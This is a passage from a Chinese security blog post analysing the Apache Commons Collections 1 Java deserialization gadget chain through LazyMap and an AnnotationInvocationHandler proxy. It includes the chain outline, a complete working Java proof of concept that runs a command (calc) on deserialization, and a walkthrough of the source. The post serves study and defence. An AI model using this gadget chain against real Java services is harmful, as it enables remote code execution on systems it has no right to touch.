<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223041.png"></p>
<p>最后是通过invoke执行代码</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304213808.png"></p>
<p>成功弹计算器</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220304223103.png"></p>
</br>

<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><h3 id="Gadget-Chain-1"><a href="#Gadget-Chain-1" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight reasonml"><table><tr><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>            <span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<p>区别是在用到了LazyMap的get方法，而前面我们是用(Map.Entry)TransformedMap.checkSetValue来调用到transform方法，基本后半部分是一样的</p>
</br>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.test;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test11</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer   );<br><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHadlConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHadlConstructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler h = (InvocationHandler) annotationInvocationHadlConstructor.newInstance(Override.class, lazyMap);<br><br>        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,h);<br>        Object o = annotationInvocationHadlConstructor.newInstance(Override.class,mapProxy);<br><br>        serialize(o);<br>        unserialize();<br>    &#125;<br><br>    <span class="hljs-comment">//序列化和反序列化</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        <span class="hljs-comment">// ObjectOutputStream 对象输出流，将Person对象存储到E盘的Person.txt文件中，完成对Person对象的序列化操作</span><br>        ObjectOutputStream oo = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        oo.writeObject(o);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<br>            <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;ser.bin&quot;</span>)));<br>        Object object = (Object) ois.readObject();<br>        System.out.println(<span class="hljs-string">&quot;反序列化成功！&quot;</span>);<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

</br>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先我们先看下区别</p>
<p>通过LazyMap.get方法调用的factory.transform()</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305103617.png"></p>
<p>因为LazyMap的构造函数是protected，我们只能通过decorate传入</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305104601.png"></p>
<p>factory属性通过decorate函数传入</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305104037.png"></p>
<p>decorate再调用到LazyMap函数</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305103918.png"></p>
<p>我们搜索下哪个地方调用了LazyMap.get，可以看到AnnotationInvocationHandler.invoke</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305110749.png"></p>
<p>我们可以看到memberValues是我们可控的</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305111232.png"></p>
</br>

<p>最终走到readObject调用到了代理类，走到了invoke</p>
<p>我们只要将memberValues传入动态代理类，并且代理的是LazyMap，使得进入invoke触发LazyMap.get，这条链就通了</p>
<p><img src="https://trrqserc-1254798411.cos.ap-guangzhou.myqcloud.com/blog-img/20220305192016.png"></p>
</br>


















    </div>
</div>
<style>
    #noneimg img {
        display: none;
        z-index: 109;
        width: 600px !important;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            width: 88%
        }
    }
</style>
<script>
    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #333;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
</script>
<div class="Last-Next">
    
    <a href="/2022/03/02/RMI%E3%80%81JNDI%E3%80%81JRMP%E7%9A%84%E6%94%BB%E5%87%BB%E9%9D%A2/">
        <div class="last">
            <span>上一篇</span>
            <p>RMI、JNDI、JRMP的攻击面</p>
        </div>
    </a>
    

    
    <a href="/2022/02/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-URLDNS/">
        <div class="next">
            <span>下一篇</span>
            <p>Java反序列化-URLDNS</p>
        </div>
    </a>
    
</div>
		
<link rel="stylesheet" href="/css/food.css">

<div class="footer">
	<div class="Copyright">
		©2022 By TRRQ. 主题：<a
			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/jquery.min.js"></script>


<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: block;
            border-radius: 50%;
            width: 66px;
            height: 66px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            border: 1px solid rgba(18, 24, 58, 0.06);

            transition: border .5s;
            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 30px;
            height: 30px;
            margin-top: 17.5px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
</script>
<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>

</html>